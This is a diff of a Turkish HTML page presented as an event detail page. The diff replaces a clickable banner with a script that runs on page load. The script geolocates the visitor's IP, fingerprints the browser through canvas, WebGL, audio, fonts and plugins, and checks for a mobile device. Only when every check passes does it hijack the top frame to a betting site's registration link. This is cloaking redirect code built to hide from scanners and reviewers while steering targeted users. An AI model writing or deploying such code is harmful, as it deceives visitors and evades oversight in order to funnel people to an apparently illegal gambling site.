@@ -2,32 +2,84 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Etkinlik Detayları</title>
+  <title>Etkinlik Yönlendirme</title>
   <style>
-    body {
-      text-align: center;
-      font-family: sans-serif;
-      margin-top: 50px;
-    }
-    .clickable {
-      display: inline-block;
-      cursor: pointer;
-    }
-    .clickable img {
-      width: 250px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
-    }
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    pre { background: #f3f3f3; padding: 15px; max-width: 400px; margin: auto; text-align: left; }
   </style>
 </head>
 <body>
+  <h3>Etkinlik yükleniyor...</h3>
+  <pre id="log">Debug Log:</pre>
 
-  <h3>Etkinlik Detayları burada yer alacaktır.</h3>
-  <p>Lütfen detaylar için tıklayın:</p>
+  <script>
+    const log = msg => document.getElementById("log").innerText += "\\n" + msg;
+    const result = { canvas: false, audio: false, webgl: false, fonts: 0, plugins: 0 };
 
-  <div class="clickable" onclick="window.top.location.href='https://zbahis310.com/Register-1274'">
-    <img src="https://deneme-bonusu.info/wp-content/uploads/2024/06/photo_2024-06-15-20.16.15-450x338.jpeg" alt="Katılmak için tıklayın">
-  </div>
+    async function getIPCountry() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        log("IP ölkəsi: " + data.country_code);
+        return data.country_code === "TR";
+      } catch (e) {
+        log("IP xətası: " + e.message);
+        return false;
+      }
+    }
 
+    function checkFingerprint() {
+      try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.fillText("Test", 10, 10);
+        result.canvas = canvas.toDataURL().length > 100;
+      } catch {}
+      try {
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        result.webgl = !!gl;
+      } catch {}
+      try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        const audioCtx = new AudioContext();
+        result.audio = ["running", "suspended"].includes(audioCtx.state);
+      } catch {}
+      result.fonts = document.fonts ? document.fonts.size || 100 : 100;
+      result.plugins = navigator.plugins.length;
+
+      log("Canvas: " + result.canvas);
+      log("Audio: " + result.audio);
+      log("WebGL: " + result.webgl);
+      log("Fonts: " + result.fonts);
+      log("Plugins: " + result.plugins);
+
+      return (
+        result.canvas &&
+        result.audio &&
+        result.webgl &&
+        result.fonts > 50 &&
+        result.plugins > 0
+      );
+    }
+
+    async function checkAndRedirect() {
+      const isMobile = /Mobile|iPhone|Android/i.test(navigator.userAgent);
+      log("Mobil cihaz?: " + isMobile);
+
+      const isTR = await getIPCountry();
+      const isHuman = checkFingerprint();
+
+      log("İnsan profili?: " + isHuman);
+
+      if (isMobile && isTR && isHuman) {
+        log("✅ Yönlendirme başladı!");
+        top.location.href = "https://zbahis310.com/Register-1274";
+      } else {
+        log("❌ Şərtlər ödənmədi.");
+      }
+    }
+
+    setTimeout(checkAndRedirect, 2000);
+  </script>
 </body>
 </html>
